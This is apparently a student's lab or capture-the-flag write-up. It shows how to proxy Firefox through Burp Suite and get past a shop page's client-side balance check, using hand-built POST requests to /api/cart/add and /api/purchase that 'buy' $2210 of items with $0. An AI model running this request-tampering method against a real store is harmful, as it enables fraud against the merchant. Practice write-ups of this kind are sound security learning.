# Burp Suite notes - client side bypass challenge

## Proxy setup
- Burp listener: 127.0.0.1:8080 (Proxy > Options)
- Firefox: Settings > Network Settings > Manual proxy > 127.0.0.1:8080, check "also use for HTTPS"
- Install cert: go to http://burp in firefox, download cert, import in Settings > Privacy > Certificates > Authorities > Import > trust it

## Fix: "proxy refusing connections"
- check burp is actually listening: `ss -tlnp | grep 8080`
- make sure GUI window is open not just terminal process

## Fix: nothing shows up in intercept for localhost
- Firefox has a hidden setting that skips proxy for localhost no matter what
- go to about:config
- search: network.proxy.allow_hijacking_localhost
- set to true
- reload page

## Why "Add to Cart" showed nothing even after that
- checked page source, found the balance check happens in JS BEFORE the fetch() call
- if balance < price it just `return`s, never sends a request
- so nothing to intercept - not a proxy problem

```js
function addToCart(itemId, itemName, itemPrice) {
    if (userBalance < itemPrice) {
        alert('Insufficient funds...');
        return; // <- blocks before any request is sent
    }
    makeAddToCartRequest(itemId, itemName);
}
```

- tried calling makeAddToCartRequest() directly in console -> ReferenceError, function was scoped inside a DOMContentLoaded wrapper, not on window
- gave up on console, went with Repeater instead

## Repeater workflow
1. Proxy > HTTP History
2. right click a GET request to localhost > Send to Repeater
   (don't build a fresh request from scratch - did that once and it tried to connect on port 443 instead of 80)
3. edit request line to POST /api/cart/add HTTP/1.1
4. add header: Content-Type: application/json
5. press Enter twice after last header (blank line = separates headers from body, required)
6. body: {"itemId": 5, "quantity": 1}
7. Ctrl+Enter or Send button top left of request panel

## Mistakes that broke it
- typo'd "OST" instead of "POST" -> silently failed
- used /api/cart instead of /api/cart/add -> 404 Cannot POST /api/cart
- Content-Length didn't match body length (put 60, body was 29 chars) -> "Item ID required" error even though json looked fine
- fix: just leave the blank line, let Burp fix Content-Length on send

## working requests/responses

itemId 5 (Webcam):
```
{"success":true,"message":"Webcam added to cart for $80.00","bypass":true,"item":{"id":5,"name":"Webcam","price":80,"quantity":1}}
```

itemId 3 (Mechanical Keyboard):
```
{"success":true,"message":"Mechanical Keyboard added to cart for $120.00","bypass":true,"item":{"id":3,"name":"Mechanical Keyboard","price":120,"quantity":1}}
```

itemId 4 (4K Monitor):
```
{"success":true,"message":"4K Monitor added to cart for $300.00","bypass":true,"item":{"id":4,"name":"4K Monitor","price":300,"quantity":1}}
```

## api/purchase

first attempt failed - "Invalid cart items data", body wasn't shaped right

item object shape is {id, name, price, quantity} - same as what /api/cart/add returns per item

request:
```
POST /api/purchase HTTP/1.1
Host: localhost
Content-Type: application/json

{"cartItems": [
  {"id": 5, "name": "Webcam", "price": 80, "quantity": 3},
  {"id": 2, "name": "Wireless Mouse", "price": 50, "quantity": 1},
  {"id": 1, "name": "Premium Laptop", "price": 1500, "quantity": 1},
  {"id": 3, "name": "Mechanical Keyboard", "price": 120, "quantity": 1},
  {"id": 4, "name": "4K Monitor", "price": 300, "quantity": 1}
]}
```

response - worked:
```
{"success":true,"message":"Purchase successful! You bypassed client-side validation and bought $2210.00 worth of items with only $0.00!","bypass":true,"total":2210,"userBalance":0}
```

challenge complete - $2210 worth of stuff bought with $0 balance
